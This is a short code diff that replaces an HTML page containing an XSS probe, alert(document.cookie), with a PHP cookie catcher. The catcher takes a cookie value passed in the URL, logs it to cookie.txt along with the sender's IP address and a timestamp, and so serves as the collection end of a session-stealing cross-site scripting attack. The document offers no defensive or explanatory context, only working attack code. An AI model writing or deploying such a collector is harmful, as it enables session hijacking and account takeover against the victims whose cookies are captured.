@@ -1,13 +1,8 @@
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<body>
-    <h1>Hi, admin </h1>
-    <script>alert(document.cookie)</script>
-</body>
-</html>
+<?php
+$cookie = $_GET['cookie'];
+$ip = getenv ('REMOTE_ADDR');
+$time = date('Y-m-d g:i:s');
+$fp = fopen("cookie.txt","a");
+fwrite($fp,"IP: ".$ip."Date: ".$time." Cookie:".$cookie."\n");
+fclose($fp);
+?>
